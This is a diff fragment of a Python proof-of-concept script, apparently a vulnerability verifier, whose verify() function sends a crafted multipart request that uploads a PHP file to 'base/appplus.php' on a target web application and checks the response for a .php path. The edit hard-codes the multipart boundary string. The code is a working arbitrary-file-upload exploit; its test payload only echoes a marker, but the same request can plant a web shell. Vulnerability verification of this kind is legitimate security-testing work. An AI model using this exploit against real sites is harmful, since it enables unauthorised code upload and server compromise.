@@ -41,7 +41,7 @@ def verify(baseurl):
 		baseurl=baseurl+"/"
 	url=baseurl+"base/appplus.php"
 	body = "------WebKitFormBoundarysuaycshx\r\nContent-Disposition: form-data; name=\"file\"; filename=\"vulntest.php\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php echo \"vulntest\";?>\r\n------WebKitFormBoundarysuaycshx\r\nContent-Disposition: form-data; name=\"act\"\r\n\r\nupload\r\n------WebKitFormBoundarysuaycshx\r\nContent-Disposition: form-data; name=\"r_size\"\r\n\r\n24\r\n------WebKitFormBoundarysuaycshx\r\nContent-Disposition: form-data; name=\"t\"\r\n\r\n"+token+"\r\n------WebKitFormBoundarysuaycshx\r\nContent-Disposition: form-data; name=\"m\"\r\n\r\n"+md+"\r\n------WebKitFormBoundarysuaycshx\r\nContent-Disposition: form-data; name=\"path\"\r\n\r\nupload\r\n------WebKitFormBoundarysuaycshx--\r\n"
-	headers={'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary'+rboundary+''}
+	headers={'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarysuaycshx'}
 	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
 	#print(key, token, md, response.text)
 	if response.status_code == 200 and ".php" in response.text:
